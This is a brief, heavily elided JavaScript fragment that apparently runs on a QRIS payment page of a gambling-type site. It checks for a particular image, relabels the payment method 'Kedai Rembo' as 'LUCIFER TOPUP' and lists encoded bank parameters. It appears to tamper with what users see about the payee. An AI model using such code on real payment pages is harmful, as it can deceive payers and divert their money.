(function() {
  ...
  if (url.endsWith('qris.php')) {
    ...
    document.querySelectorAll('img').forEach(img => {
      if (img.src === "https://maung303jp.xyz/m/account/winner.png") {
    ...
    if (metodeSelect && metodeSelect.textContent.includes("Kedai Rembo")) {
      metodeSelect.textContent = "LUCIFER TOPUP";
    }
  }

  // Fungsi untuk jalankan di url /?bank=NDk5 dll
  const bankParams = ['MTc=','MTY=','MTg=','MjA=','MjE=','MjI=','MTM2OA=='];
